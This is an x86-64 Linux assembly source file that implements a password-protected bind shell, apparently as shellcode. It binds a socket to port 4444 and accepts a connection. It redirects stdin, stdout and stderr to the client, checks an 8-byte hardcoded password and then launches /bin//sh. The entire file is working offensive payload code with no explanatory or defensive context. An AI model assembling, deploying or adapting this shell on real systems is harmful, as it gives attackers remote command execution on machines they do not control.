global _start

_start:

        mov rax, 41
        mov rdi, 2
        mov rsi, 1
        mov rdx, 0
        syscall

        mov rdi, rax

        xor rax, rax

        push rax
        mov dword [rsp-4], eax
        mov word [rsp-6], 0x5c11
        mov word [rsp-8], 0x2
        sub rsp, 8

        mov rax, 49
        mov rsi, rsp
        mov rdx, 16
        syscall

        mov rax, 50
        mov rsi, 2
        syscall

        mov rax, 43
        sub rsp, 16
        mov rsi, rsp
        mov byte [rsp-1], 16
        sub rsp, 1
        mov rdx, rsp
        syscall

        mov r9, rax

        mov rax, 3
        syscall

        mov rax, 33
        mov rdi, r9
        mov rsi, 0
        syscall

        mov rax, 33
        mov rsi, 1
        syscall

        mov rax, 33
        mov rsi, 2
        syscall

        xor rax, rax

        push r10
        mov rsi, rsp

        mov rdx, 16
        syscall

        mov rax, [rel pass]
        mov rdi, rsi
        scasq
        jne exit

        xor rax, rax
        push rax

        mov rbx, 0x68732f2f6e69622f
        push rbx

        mov rdi, rsp

        push rax

        mov rdx, rsp

        push rdi
        mov rsi, rsp
        mov rax, 59
        syscall

        ; change as needed
        pass: db "8bytesss"

exit:
        mov rax, 60
        syscall
